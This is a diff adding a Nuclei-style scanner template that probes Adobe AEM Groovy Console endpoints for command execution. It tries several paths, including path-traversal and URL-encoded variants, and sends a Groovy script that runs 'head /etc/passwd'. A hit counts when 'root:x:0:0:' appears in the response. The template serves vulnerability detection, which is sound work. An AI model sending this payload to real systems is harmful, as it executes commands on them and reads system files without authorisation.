@@ -1,0 +1,41 @@
+id: custom-groovyconsole-command-execution
+
+info:
+  name: Groovy Console Command Execution Check
+  author: x86rd
+  severity: high
+  description: Attempts to execute a command via /bin/groovyconsole/post.servlet and checks for evidence of successful execution.
+  tags: groovy,command,execution
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/bin/groovyconsole/post.servlet"
+      - "{{BaseURL}}/aem/bin/groovyconsole/post.servlet"
+      - "{{BaseURL}}/app/bin/groovyconsole/post.servlet" 
+      - "{{BaseURL}}/../../../../groovyconsole/post.servlet"
+      - "{{BaseURL}}/etc/bin/groovyconsole/post.servlet"
+      - "{{BaseURL}}%2fbin%2fgroovyconsole%2fpost.servlet"
+      - "{{BaseURL}}%2faem%2fbin%2fgroovyconsole%2fpost.servlet"
+      - "{{BaseURL}}%2fapp%2fbin/%2fgroovyconsole%2fpost.servlet" 
+      - "{{BaseURL}}%2f..%2f..%2f..%2f..%2fgroovyconsole%fpost.servlet"
+      - "{{BaseURL}}%2fetc%2fbin%2fgroovyconsole%2fpost.servlet"
+
+    headers:
+      User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+      Accept-Language: en-US, en;q=0.5
+      Accept-Encoding: gzip, deflate
+      Connection: close
+      Upgrade-Insecure-Requests: "1"
+      Content-Type: application/x-www-form-urlencoded
+
+    body: |
+      script=def+proc+%3D+%22head+/etc/passwd%22.execute()%0D%0Aprintln+proc.text
+
+    matchers:
+      - type: word
+        words:
+          - "root:x:0:0:"
+        part: body
+        condition: and
